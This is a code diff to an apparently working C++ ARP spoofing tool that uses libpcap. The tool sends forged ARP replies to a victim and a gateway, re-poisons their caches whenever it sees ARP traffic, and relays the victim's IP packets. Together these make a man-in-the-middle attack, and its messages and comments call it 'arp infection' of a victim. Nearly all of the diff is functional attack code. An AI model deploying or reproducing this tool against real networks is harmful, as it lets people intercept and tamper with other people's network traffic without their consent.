@@ -1,10 +1,10 @@
 #include <arpa/inet.h>//ip -> bin
 #include <cstring>
+#include <cstdio>
 #include <ifaddrs.h>
 #include <iostream>
 #include <net/ethernet.h>
 #include <net/if.h>
-#include <netdb.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
@@ -73,30 +73,7 @@ void arp_request(char *snd_ip,uint8_t *snd_mac,char *trg_ip,pcap_t *fp)
         fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
     }
 }
-void arp_reply(char *snd_ip,uint8_t *snd_mac,char *trg_ip, uint8_t *trg_mac,pcap_t *fp)
-{
-    cout<<"Once Attack arp inifection!"<<endl;
-    struct my_hdr mh;
-    struct _ether_hdr *eh = &mh.eh;
-    struct _arp_hdr *ah = &mh.ah;
-    inet_pton(AF_INET,snd_ip,&ah->sender_ip);
-    memcpy(eh->Src_mac,snd_mac,6);
-    inet_pton(AF_INET,trg_ip,&ah->target_ip);
-    memcpy(eh->Dst_mac,trg_mac,6);
-    memcpy(ah->sender_mac,eh->Src_mac,6);
-    memcpy(ah->target_mac,eh->Dst_mac,6);
-    eh->ether_type = ntohs(0x0806);
-    ah->htype = ntohs(0x0001);
-    ah->ptype = ntohs(0x0800);
-    ah->hlen = 0x06;
-    ah->plen = 0x04;
-    ah->opcode = ntohs(0x0002);
-        if(pcap_sendpacket(fp,(const u_char*)&mh,42) != 0)
-        {
-            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
-        }
-}
-void arp_infection(char *snd_ip,uint8_t *snd_mac,char *trg_ip, uint8_t *trg_mac,pcap_t *fp)
+void arp_infection(char *snd_ip,uint8_t *snd_mac,char *trg_ip, uint8_t *trg_mac,int ws,pcap_t *fp)
 {
     cout<<"start arp infection..."<<endl;
     struct my_hdr mh;
@@ -114,14 +91,17 @@ void arp_infection(char *snd_ip,uint8_t *snd_mac,char *trg_ip, uint8_t *trg_mac,
     ah->hlen = 0x06;
     ah->plen = 0x04;
     ah->opcode = ntohs(0x0002);
-    while(!quit)
+    quit = ws;  //select whether to infect or periodically infect
+    do
     {
         if(pcap_sendpacket(fp,(const u_char*)&mh,42) != 0)
         {
             fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
         }
         sleep(1);
-    }
+    }while(!quit);
+    if(ws == 1)
+        quit = 0;
 }
 void get_my_addr(const char*ifname,char* outputmyip,uint8_t*outputmymac)
 {
@@ -208,7 +188,9 @@ void anti_recovery_and_relay_packet(char *snd_ip,uint8_t *snd_mac,char *trg_ip, 
             iph = (struct iphdr*)(pkt_data+sizeof(struct _ether_hdr));
             if(etype == ETHERTYPE_ARP)
             {
-                arp_reply(snd_ip,snd_mac,trg_ip,trg_mac,fp);
+                cout<<"Detected ARP Packet!"<<endl;
+                arp_infection(snd_ip,snd_mac,trg_ip,trg_mac,1,fp);
+                break;
             }
             if(etype == ETHERTYPE_IP)
             {
@@ -216,10 +198,12 @@ void anti_recovery_and_relay_packet(char *snd_ip,uint8_t *snd_mac,char *trg_ip, 
                 {
                     if(!(u32_atk_ip == iph->saddr))
                     {
-                        cout<<"Detect ip infection packet"<<endl;
                         memcpy(eh->Dst_mac,rcv_mac,6);
                         memcpy(eh->Src_mac,snd_mac,6);
-                        pcap_sendpacket(fp,pkt_data,(sizeof(struct _ether_hdr)+htons(iph->tot_len)));
+                        if(pcap_sendpacket(fp,pkt_data,(sizeof(struct _ether_hdr)+htons(iph->tot_len)))!=0)
+                        {
+                            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
+                        }
                         break;
                     }
                 }
@@ -228,13 +212,12 @@ void anti_recovery_and_relay_packet(char *snd_ip,uint8_t *snd_mac,char *trg_ip, 
     }
 
 }
-
 int main(int argc,char *argv[])
 {
     if(argc != 4)
     {
-        printf("not enough argument!\n");
-        printf("EX : DEVICE SENDER_IP TARGET_IP\n");
+        cout<<"not enough argument!"<<endl;
+        cout<<"EX : DEVICE Gateway_IP TARGET_IP"<<endl;
         return 1;
     }
 /*  attacker= atk_ip,atk_mac    (attacker)
@@ -248,9 +231,9 @@ int main(int argc,char *argv[])
     uint8_t snd_mac[6];
     char *rcv_ip = argv[2]; //get gateway ip addr
     uint8_t rcv_mac[6];
-//    int plen;
 
     get_my_addr(dev,atk_ip,atk_mac);    //get My ip , mac address
+
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *fp;
     if((fp= pcap_open_live(dev, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS , 1, errbuf)) == NULL)
@@ -263,7 +246,7 @@ int main(int argc,char *argv[])
     get_target_mac(rcv_mac,rcv_ip,fp);          //If I have gateway's ip, give my mac to attacker
 
     signal(SIGINT,signal_handler);
-    thread t1(arp_infection,rcv_ip,atk_mac,snd_ip,snd_mac,fp);  //send arp_infection to victim periodically
+    thread t1(arp_infection,rcv_ip,atk_mac,snd_ip,snd_mac,0,fp);  //send arp_infection to victim periodically
     anti_recovery_and_relay_packet(rcv_ip,atk_mac,snd_ip,snd_mac,atk_ip,rcv_mac,fp);
     t1.join();
 }
